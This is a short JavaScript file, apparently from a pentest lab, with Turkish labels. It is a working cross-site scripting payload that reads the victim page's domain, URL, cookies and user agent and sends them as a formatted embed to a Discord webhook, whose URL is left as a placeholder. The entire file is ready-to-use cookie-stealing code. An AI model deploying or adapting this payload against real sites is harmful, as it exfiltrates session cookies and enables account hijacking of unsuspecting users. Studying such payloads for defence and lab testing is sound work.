// GitHub: s.js
const webhookURL = "BURAYA_DISCORD_WEBHOOK_URL_GELECEK";

const data = {
    username: "XSS Bot - Kaptan Pengu",
    content: "🚀 **Yeni Veri Sızdırıldı!**",
    embeds: [{
        title: "Saldırı Detayları",
        color: 16711680, // Kırmızı
        fields: [
            { name: "Domain", value: document.domain, inline: true },
            { name: "Sayfa", value: location.href, inline: true },
            { name: "Çerezler (Cookies)", value: "```" + (document.cookie || "Yok/HttpOnly") + "```" },
            { name: "Kullanıcı Aracısı", value: navigator.userAgent }
        ],
        footer: { text: "CachyOS Pentest Lab" }
    }]
};

fetch(webhookURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
});